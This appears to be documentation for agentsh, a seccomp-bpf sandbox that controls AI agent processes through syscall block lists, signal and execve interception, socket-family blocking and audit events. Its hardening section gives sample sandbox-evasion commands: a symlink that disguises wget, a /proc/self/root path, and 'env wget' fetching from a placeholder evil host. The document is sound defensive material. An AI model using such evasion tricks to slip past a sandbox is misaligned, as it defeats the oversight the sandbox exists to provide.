# Seccomp-BPF Syscall Filtering

agentsh uses seccomp-bpf to enforce syscall-level security controls on agent processes.

## Overview

When enabled, seccomp filtering provides three types of protection:

1. **Unix Socket Monitoring**: Intercepts socket operations for policy-based access control
2. **Signal Interception**: Intercepts signal delivery for policy-based allow/deny/redirect
3. **Syscall Blocking**: Denies (and optionally kills) processes that attempt blocked syscalls

## Configuration

```yaml
sandbox:
  seccomp:
    enabled: true
    mode: enforce  # enforce | audit | disabled

    unix_socket:
      enabled: true
      action: enforce  # enforce | audit

    signal_filter:
      enabled: true
      action: enforce  # enforce | audit

    syscalls:
      default_action: allow  # allow | block
      block:
        - ptrace
        - process_vm_readv
        - process_vm_writev
        - mount
        - umount2
        # ... see defaults below
      on_block: errno  # errno | kill | log | log_and_kill (default: errno)

    # Per-AF_* socket family blocking on socket(2) and socketpair(2).
    # Unset → recommended-default list applied (12 families at errno).
    # Set to [] → opt out of all family blocking entirely.
    # Non-empty list → overrides defaults.
    blocked_socket_families:
      - family: AF_ALG       # by name (preferred) or numeric ("38")
        action: errno        # errno | kill | log | log_and_kill (default: errno)
      - family: AF_VSOCK
        action: log_and_kill
```

## Signal Interception

Signal filtering uses `SECCOMP_RET_USER_NOTIF` to intercept signal-related syscalls before they execute. This allows agentsh to evaluate policy rules and decide whether to allow, deny, redirect, or audit the signal.

### Intercepted Syscalls

| Syscall | Purpose |
|---------|---------|
| `kill` | Send signal to process by PID |
| `tkill` | Send signal to thread by TID |
| `tgkill` | Send signal to thread in specific process |
| `rt_sigqueueinfo` | Queue signal with additional data |
| `pidfd_send_signal` | Send signal via process file descriptor |

### How It Works

1. Process calls `kill(pid, SIGTERM)` or similar
2. seccomp traps the syscall and notifies agentsh via the user-notify fd
3. agentsh classifies the target (self, child, external, system, etc.)
4. Policy rules are evaluated for the signal/target combination
5. Decision is executed:
   - **allow**: Syscall continues normally
   - **deny**: Returns EPERM to caller
   - **redirect**: Signal number is modified (e.g., SIGKILL → SIGTERM)
   - **audit**: Syscall allowed, event logged

### Policy Configuration

Signal rules are defined in the policy file:

```yaml
signal_rules:
  # Allow signals to self and children
  - name: allow-self
    signals: ["@all"]
    target:
      type: self
    decision: allow

  - name: allow-children
    signals: ["@all"]
    target:
      type: children
    decision: allow

  # Block fatal signals to external processes
  - name: deny-external-fatal
    signals: ["@fatal"]
    target:
      type: external
    decision: deny

  # Redirect SIGKILL to SIGTERM for graceful shutdown
  - name: graceful-kill
    signals: ["SIGKILL"]
    target:
      type: descendants
    decision: redirect
    redirect_to: SIGTERM
```

### Signal Groups

| Group | Signals |
|-------|---------|
| `@all` | All signals (1-31) |
| `@fatal` | SIGKILL, SIGTERM, SIGQUIT, SIGABRT |
| `@job` | SIGSTOP, SIGCONT, SIGTSTP, SIGTTIN, SIGTTOU |
| `@reload` | SIGHUP, SIGUSR1, SIGUSR2 |

### Signal Events

```json
{
  "type": "signal_blocked",
  "timestamp": "2026-01-11T10:30:00Z",
  "session_id": "sess_abc123",
  "sender_pid": 12345,
  "target_pid": 1,
  "signal": "SIGKILL",
  "signal_number": 9,
  "target_type": "system",
  "decision": "deny",
  "policy_rule": "deny-system-signals"
}
```

See [Policy Documentation](operations/policies.md#signal-rules) for full configuration options.

## Execve Interception

Execve interception uses `SECCOMP_RET_USER_NOTIF` to trap `execve` and `execveat` syscalls, allowing agentsh to evaluate command execution against policy before it happens.

### Security Hardening

#### Path Canonicalization

Before policy evaluation, agentsh resolves the executable path using `filepath.EvalSymlinks`. This defeats bypass attacks using:
- Symlinks to blocked binaries (e.g., `ln -s /usr/bin/wget /tmp/safe && /tmp/safe`)
- `/proc/self/root` paths (e.g., `/proc/self/root/usr/bin/wget`)
- Relative path tricks

The original (pre-canonicalization) path is preserved in audit events as `raw_filename` for forensic analysis.

#### Transparent Command Unwrapping

When a wrapper command (like `env`, `sudo`, or `ld-linux`) is detected, agentsh "unwraps" it to find the real payload command and evaluates both against policy. The most restrictive decision wins.

**Example:** `env wget http://evil.com`
1. `env` is recognized as transparent → unwrap
2. Payload `wget` found after skipping flags/assignments
3. Both `env` and `wget` evaluated: if `wget` is denied, the whole execution is denied

See [Policy Documentation](operations/policies.md#transparent-commands) for configuration.

### Execve Events

```json
{
  "type": "execve",
  "timestamp": "2026-03-04T10:30:00Z",
  "session_id": "sess_abc123",
  "pid": 12345,
  "parent_pid": 12300,
  "depth": 1,
  "filename": "/usr/bin/wget",
  "raw_filename": "/proc/self/root/usr/bin/wget",
  "argv": ["wget", "https://example.com"],
  "unwrapped_from": "/usr/bin/env",
  "payload_command": "wget",
  "effective_action": "blocked",
  "policy": {
    "decision": "deny",
    "effective_decision": "deny",
    "rule": "block-wget"
  }
}
```

## Default Blocked Syscalls

When seccomp is enabled, these syscalls are blocked by default:

| Syscall | Reason |
|---------|--------|
| ptrace | Process debugging/injection |
| process_vm_readv | Cross-process memory read |
| process_vm_writev | Cross-process memory write |
| personality | Execution domain changes |
| mount | Filesystem mounting |
| umount2 | Filesystem unmounting |
| pivot_root | Root filesystem changes |
| reboot | System reboot |
| kexec_load | Kernel replacement |
| init_module | Kernel module loading |
| finit_module | Kernel module loading (fd) |
| delete_module | Kernel module unloading |

## Syscall Block Actions

`sandbox.seccomp.syscalls.on_block` selects what happens when a process invokes a syscall that appears in `block:`. Four values are supported; the default is `errno`.

| Value          | Kernel mechanism                              | Effect on caller         | Event emitted              |
| -------------- | --------------------------------------------- | ------------------------ | -------------------------- |
| `errno`        | `SCMP_ACT_ERRNO(EPERM)`                       | syscall returns `EPERM`  | no (kernel-only)           |
| `kill`         | `SCMP_ACT_KILL_PROCESS`                       | process killed by SIGSYS | no (kernel-only)           |
| `log`          | `SCMP_ACT_NOTIFY` + handler responds `EPERM`  | syscall returns `EPERM`  | `seccomp_blocked`, outcome `denied` |
| `log_and_kill` | `SCMP_ACT_NOTIFY` + handler sends `SIGKILL`   | process killed by SIGKILL | `seccomp_blocked`, outcome `killed` |

**Why four modes:** `errno` is the lowest-cost default — well-behaved agents get a predictable `EPERM` and carry on; misbehaving ones are stopped at the kernel. `kill` is the irrevocable stance. `log` / `log_and_kill` take a user-notify round-trip per blocked call, so they are observable but more expensive; reach for them when you want an audit trail of every attempted violation.

**Startup warning:** when `on_block` is `log` or `log_and_kill` but no audit sink is registered, agentsh logs a warning at startup so operators don't wonder where events went.

## Socket Family Blocking

`sandbox.seccomp.blocked_socket_families` blocks creation of specified `AF_*` socket families on `socket(2)` and `socketpair(2)`. Mitigates the recurring CVE class where `socket(AF_<niche-family>, ...)` is the kernel attack entry point — see [copy.fail](https://copy.fail/#mitigation) for the AF_ALG case that motivated this feature.

### Default list (when field unset)

When `blocked_socket_families` is omitted from config, agentsh applies a recommended-default list of 12 families at `action: errno`. Set the field to `[]` to opt out entirely; set it to a non-empty list to override the defaults.

| Family | Number | Why default |
|---|---|---|
| `AF_ALG` | 38 | copy.fail mitigation; near-zero legitimate userspace use |
| `AF_VSOCK` | 40 | Niche (VM-host); multiple historical CVEs |
| `AF_RDS` | 21 | Reliable Datagram Sockets; multiple CVEs; effectively dead |
| `AF_TIPC` | 30 | Niche cluster protocol; multiple CVEs |
| `AF_KCM` | 41 | Kernel Connection Multiplexor; niche; CVEs |
| `AF_X25`, `AF_AX25`, `AF_NETROM`, `AF_ROSE`, `AF_DECnet`, `AF_APPLETALK`, `AF_IPX` | various | Legacy/dead protocols, pure attack surface |

**Not** in defaults (too widely used; opt-in only): `AF_NETLINK`, `AF_PACKET`, `AF_BLUETOOTH`, `AF_CAN`.

### Family resolution

Each entry's `family` field accepts either a name (`AF_ALG`) or a numeric string (`38`). Names resolve via a built-in table; numbers in `[0, 64)` are accepted as a fallback for families the table doesn't yet know. Unknown names and out-of-range numbers are rejected at config-load time.

### Action mapping

| Action | Effect on `socket(AF_X, ...)` | Audit event |
|---|---|---|
| `errno` | Returns `EAFNOSUPPORT` (97) — the standard "this family isn't supported" code | none (kernel-side) |
| `kill` | Process killed by `SCMP_ACT_KILL_PROCESS` | none (kernel-side) |
| `log` | Returns `EAFNOSUPPORT` + emits audit event | `seccomp_socket_family_blocked`, outcome `denied` |
| `log_and_kill` | Process killed by `SIGKILL` + emits audit event | `seccomp_socket_family_blocked`, outcome `killed` |

`errno` is the right default for security tooling — well-behaved userspace falls back gracefully when a family isn't supported.

### Two enforcement engines

Family blocking has two engines that share the same config and emit identical audit-event shapes:

1. **seccomp-bpf (primary)** — adds an `AddRuleConditional` rule on `socket(2)` arg0 to the existing seccomp filter. Cheap, kernel-side. Used when seccomp is available AND the agentsh-unixwrap binary will run.
2. **ptrace (fallback + defensive)** — when `sandbox.ptrace.enabled: true`, the family checker is also wired into the ptrace tracer regardless of which engine the selector reports. Runtime dispatch is mutually exclusive between engines, so this is safe and ensures coverage in hybrid configurations where the seccomp wrapper is skipped.

If neither engine is available on the host, agentsh logs a startup warning and continues — families are not blocked.

### Audit event

```json
{
  "type": "seccomp_socket_family_blocked",
  "timestamp": "2026-04-29T18:00:00Z",
  "session_id": "sess_abc123",
  "source": "seccomp",
  "pid": 12345,
  "fields": {
    "family_name": "AF_ALG",
    "family_number": 38,
    "syscall": "socket",
    "action": "log_and_kill",
    "outcome": "killed",
    "engine": "seccomp"
  }
}
```

| Field | Meaning |
|---|---|
| `family_name` | Original config name (e.g. `AF_ALG`); empty if the entry was numeric-only |
| `family_number` | Resolved AF_* number |
| `syscall` | `socket` or `socketpair` |
| `action` | Value of `action` that matched (`log` or `log_and_kill`) |
| `outcome` | `denied` (errno path) / `killed` (kill landed) / `vanished` (tracee gone before enforcement) / `deny_failed` / `deny_fallback_failed` |
| `engine` | `seccomp` or `ptrace` — same audit shape regardless |

### Coexistence

When a family is in `blocked_socket_families` AND `socket` is in `blocked_syscalls`, the family rule wins (more specific). When `unix_socket.enabled: true` is also set, libseccomp's action-precedence ensures family `errno`/`kill` rules outrank the unconditional `ActNotify` on `socket(2)` — AF_UNIX traffic still flows through unix-socket monitoring; AF_ALG (etc.) is denied.

### Validation

Config typos fail fast at startup with a clear error:

```
sandbox.seccomp.blocked_socket_families[0].family: "AF_ALGOG" is not a valid AF_* name or number
sandbox.seccomp.blocked_socket_families[1].action: "deny" is not valid (allowed: errno, kill, log, log_and_kill)
```

## Audit Events

When a block-listed syscall traps under `log` or `log_and_kill`, a `seccomp_blocked` event is emitted. `errno` and `kill` do not emit — enforcement is kernel-side and no user-notify round trip occurs.

```json
{
  "type": "seccomp_blocked",
  "timestamp": "2026-04-15T10:30:00Z",
  "session_id": "sess_abc123",
  "source": "seccomp",
  "pid": 12345,
  "fields": {
    "syscall": "ptrace",
    "syscall_nr": 101,
    "action": "log_and_kill",
    "outcome": "killed",
    "arch": "arm64"
  }
}
```

| Field        | Meaning                                                                       |
| ------------ | ----------------------------------------------------------------------------- |
| `pid`        | TID of the thread that made the syscall (for multi-threaded agents, not always the TGID). |
| `syscall`    | Human-readable syscall name resolved via libseccomp, or `unknown(N)` if unresolvable. |
| `syscall_nr` | Raw syscall number from `struct seccomp_notif.data.syscall`.                  |
| `action`     | Value of `on_block` that matched (`log` or `log_and_kill`).                   |
| `outcome`    | `denied` under `log`; `killed` under `log_and_kill` when the kill landed; `denied` under `log_and_kill` if the kill could not be delivered. |
| `arch`       | Go runtime arch (`amd64`, `arm64`) — surfaces the filter's native architecture. |

## Requirements

- Linux kernel 5.0+ with seccomp user-notify support
- libseccomp installed (for syscall name resolution)
- CAP_SYS_ADMIN or no_new_privs for filter installation

**Tip:** Use `agentsh detect` to check if seccomp is available in your environment. See [Cross-Platform Notes](cross-platform.md#detecting-available-capabilities).
